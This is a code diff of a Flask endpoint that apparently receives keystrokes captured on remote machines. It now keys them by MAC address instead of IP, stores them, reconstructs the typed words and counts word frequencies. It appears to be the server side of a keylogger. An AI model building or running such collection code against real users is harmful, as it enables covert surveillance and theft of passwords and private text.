@@ -1,4 +1,3 @@
-
 from flask import Blueprint, request
 import json
 from typing import List, Dict, Final
@@ -21,7 +20,7 @@ def record() -> Dict[str, int]:
     """
     data: Dict[str, List[str]] = json.loads(request.json)
 
-    ip: str = request.remote_addr
+    mac: str = data['mac']
     letters: List[str] = data['keys_pressed']
 
     if not Path(f'.{os.sep}data').exists():
@@ -35,13 +34,13 @@ def record() -> Dict[str, int]:
         data = {}
 
     previous_string: str = ''
-    if ip in data.keys():
-        previous_string = data[ip]['string']
+    if mac in data.keys():
+        previous_string = data[mac]['string']
 
     previous_string += process_key_string(letters)
-    data[ip] = {}
-    data[ip]["string"] = previous_string
-    data[ip]["frequency_map"] = generate_frequency_map(previous_string)
+    data[mac] = {}
+    data[mac]["string"] = previous_string
+    data[mac]["frequency_map"] = generate_frequency_map(previous_string)
 
     with open(data_file, "w+") as fp:
         json.dump(data, fp)
@@ -54,7 +53,7 @@ def process_key_string(keys: List[str]) -> str:
     Return a string of an attempt to convert a string of keyboard input to the words typed.
 
     Arguments:
-        ip: the ip address of the machine to grab the keys for.
+        mac: the mac address of the machine to grab the keys for.
 
     Return:
         the string version of the keyboard input
@@ -93,7 +92,8 @@ def tokenize(data: str, seperators: List[str]) -> List[str]:
     current_token: str = ''
     tokens: list[str] = []
     for char in data:
-        if current_token == '' or (char in seperators) == (current_token[0] in seperators):
+        if current_token == '' or (char in seperators) == (
+                current_token[0] in seperators):
             current_token += char
         else:
             tokens.append(current_token)
@@ -112,8 +112,9 @@ def generate_frequency_map(data: str) -> Dict[str, int]:
     Return:
         the frequency map of the given string.
     """
-    seperators: Final[List[str]] = [',', '.', '\n', ' ',
-                                    '\t', '?', '<', '>', '!', ':', ';']
+    seperators: Final[List[str]] = [
+        ',', '.', '\n', ' ', '\t', '?', '<', '>', '!', ':', ';'
+    ]
     tokens: List[str] = tokenize(data, seperators)
 
     frequency_map: Dict[str, int] = {}
